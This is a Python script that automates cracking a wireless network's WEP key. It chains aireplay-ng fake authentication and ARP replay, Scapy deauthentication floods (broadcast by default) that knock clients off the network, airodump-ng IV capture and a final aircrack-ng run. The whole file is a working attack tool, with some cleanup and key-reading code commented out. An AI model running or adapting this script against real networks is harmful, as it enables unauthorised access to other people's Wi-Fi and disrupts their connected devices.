from scapy.all import *
from argparse import ArgumentParser as AP
import subprocess
import multiprocessing as mp
import shlex
import time
import csv
import os
import signal

# T1: Keep attempting to get ARP packets until success; Terminated by T3
def getARP(cmd_str, target, accessPoint, interface, deauthCount, conn):
    aireplay = subprocess.Popen(cmd_str, stdout=subprocess.PIPE)
    dd = subprocess.Popen(['dd', 'of=aireplay_output.txt'], stdin=aireplay.stdout, stderr=subprocess.PIPE)
    aireplay.stdout.close()
    pid = aireplay.pid
    conn.send(pid)
    conn.close()

    got_arp = False

    while not got_arp:
        time.sleep(3)
        f = open('aireplay_output.txt', 'r')
        for line in f:
            if 'ARP requests and' in line:
                if 'got 0 ARP requests' in line:
                    continue
                else:
                    got_arp = True
                    break
        if not got_arp:
            # Send de-auth packets
            dot11 = Dot11(addr1=target, addr2=accessPoint, addr3=accessPoint)
            deauth_packet = RadioTap()/dot11/Dot11Deauth()
            sendp(deauth_packet, iface=interface, count=deauthCount, inter=0.100, verbose=0)


# T2: Function to run subprocess.Popen(cmd_airodump) as async; terminated by T3
def runairodump(cmd_str, conn):
    airodump = subprocess.Popen(cmd_str, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    pid = airodump.pid
    conn.send(pid)
    conn.close()


# T3: Check if we have enough IVs to terminate first two child processes
def get_enough_iv(e,n, packet_capture_count):

    # Continue checking if we have enough ivs, kill T1 and T2 when we do
    while not e.is_set():
        try:
            csv_file = open('output-01.csv')
            csv_reader = csv.reader(csv_file, delimiter=',')
            line_count = 0

            for row in csv_reader:
                if line_count == 2:
                    n.value = int(row[10])
                    line_count += 1

                else: line_count += 1
            if n.value >= packet_capture_count: e.set()
        except:
            continue

# Main program elements
if __name__ == "__main__":

    # setup command line options, flags, and help
    parser = AP(description="Capture ARP packets, exctract the RC4 keystreams, and crack the WEP key.")
    parser.add_argument("-i", "--interface", help="interface to sniff and send packets from", required=True)
    parser.add_argument("-a", "--access_point", help="MAC address of the access point, also known as the BSSID of the network.", required=True)
    parser.add_argument("-s", "--source", help="MAC address of the device injecting the packets. run ifconfig to find it", required=True)
    parser.add_argument("-c", "--channel", help="Channel that target network is operation on.", required=True)
    parser.add_argument("-p", "--packets", help="packets per second to inject", default=500)
    parser.add_argument("-t", "--target", help="MAC address of the target device for the de-auth attack, default is broadcast", default='ff:ff:ff:ff:ff:ff')
    parser.add_argument("-n", "--number_deauth", help="Number of de-auth packets to send per batch", default=25)
    parser.add_argument("-r", "--captured_arp_packets", help="Number of IVs to capture before attempting to crack password.")

    # Get command line argument values
    args = parser.parse_args()
    iface = args.interface
    access_point = args.access_point
    source_mac = args.source
    network_channel = args.channel
    packets_per_second = args.packets
    de_auth_target = args.target
    de_auth_packet_count = args.number_deauth
    packet_capture_count = args.captured_arp_packets

    # Setup command syntax using command line args provided
    cmd_fake_auth = shlex.split(f'aireplay-ng --fakeauth 0 -a {access_point} -h {source_mac} {iface}')
    cmd_arpreplay = shlex.split(f'aireplay-ng --arpreplay -b {access_point} -h {source_mac} {iface}')
    cmd_airodump = shlex.split(f'airodump-ng {iface} --bssid {access_point} --channel {network_channel} --write output')
    cmd_aircrack = shlex.split('aircrack-ng output-01.cap')

    # Run initial check to determine if target network can be reached
    fake_auth = subprocess.Popen(cmd_fake_auth, stdout = subprocess.PIPE)

    # Thread #1: get ARP packets; Terminated by T3 completion
    parent_aire_conn, child_aire_conn = mp.Pipe()
    process_getARP = mp.Process(target=getARP, args=(cmd_arpreplay,de_auth_target, access_point, iface, de_auth_packet_count, child_aire_conn))
    process_getARP.start()
    pid_aireplay = parent_aire_conn.recv()
    parent_aire_conn.close()

    # Thread #2: Run the dump; terminated by T3 completion
    parent_airo_conn, child_airo_conn = mp.Pipe()
    process_runairodump = mp.Process(target=runairodump, args=(cmd_airodump,child_airo_conn))
    process_runairodump.start()
    pid_airodump = parent_airo_conn.recv()
    parent_airo_conn.close()

    # Thead #3: Wait until we have sufficient IVs then terminate T1 and T2
    num_ivs = mp.Value('i', 0)
    enough_ivs = mp.Event()

    # Setup and start process
    process_get_enough_ivs = mp.Process(target=get_enough_iv, args=(enough_ivs, num_ivs, packet_capture_count))
    process_get_enough_ivs.start()

    # Join, so the function is now blocking; Make parent wait for completion
    process_get_enough_ivs.join()

    # Once T3 exits, flag must be set, so we kill T1 and T2
    process_getARP.join()
    os.kill(pid_aireplay, signal.SIGKILL)
    process_getARP.close()
    process_runairodump.join()
    os.kill(pid_airodump, signal.SIGKILL)
    process_runairodump.close()
    process_get_enough_ivs.close()

    # File cleanup
    # if os.path.exists('aircrack_output.txt'):
    #     os.remove('aircrack_output.txt')
    # if os.path.exists('aireplay_output.txt'):
    #     os.remove('aireplay_output.txt')
    # if os.path.exists('output-01.cap'):
    #     os.remove('output-01.cap')
    # if os.path.exists('output-01.csv'):
    #     os.remove('output-01.csv')
    # if os.path.exists('output-01.kismet.csv'):
    #     os.remove('output-01.kismet.csv')
    # if os.path.exists('output-01.kismet.netxml'):
    #     os.remove('output-01.kismet.netxml')
    # if os.path.exists('output-01.log.csv'):
    #     os.remove('output-01.log.csv')
    # replay_arp-[0-9]+-[0-9]+\.cap
    # if os.path.exists('replay_arp-*.cap'):
    #     os.remove('replay_arp-*.cap')

    # files = ['aircrack_output.txt', 'aireplay_output.txt', 'output-01.cap', 'output-01.csv', 'output-01.kismet.csv', 'output-01.kismet.netxml', 'output-01.log.csv']
    # pattern = re.compile(r"replay_arp-[0-9]+-[0-9]+\.cap")
    # for filename in os.scandir(dirname):
    #     if filename.name in files:
    #         try:
    #             os.remove(os.path.join(dirname, filename))
    #         except:
    #             pass
    #     elif pattern.match(filename.name):
    #         try:
    #             os.remove(os.path.join(dirname, filename))
    #         except:
    #             pass

    # Run AirCrack-ng using captured data; Continuing attack on parent process
    aircrack = subprocess.Popen(cmd_aircrack)
    # aircrack.stdout.close()

    # Setup status flag and store key
    # completed = False
    # key_line = ''

    # Run the final stage, attempting to find the key and saving it
    # while not completed:
    #     time.sleep(3)
    #     try:
    #         f = open('key.txt', 'r')
    #         for line in f:
    #             key_line = line
    #         completed = True
    #     except:
    #         continue

    # Print found key if attack worked
    # key = key_line.rstrip().split(' ')[3]
    # print(key_line)